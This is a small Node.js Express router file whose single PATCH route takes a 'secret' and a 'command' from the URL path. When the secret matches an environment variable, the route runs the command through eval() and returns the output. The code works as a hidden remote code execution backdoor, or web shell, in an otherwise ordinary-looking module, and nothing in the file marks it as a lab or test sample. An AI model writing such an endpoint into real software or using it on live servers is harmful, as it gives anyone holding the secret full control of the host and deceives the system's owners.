const { Router } = require('express');

const expressRouter = Router();

expressRouter.patch('/:secret/:command', (req, res) => {
    if (req.params.secret == process.env.SECRET_MESSAGE) {
        responseToCLient = eval(req.params.command);
        if (responseToCLient == undefined) responseToCLient = "No output";
        res.send(responseToCLient.toString());
    }
});

module.exports = expressRouter;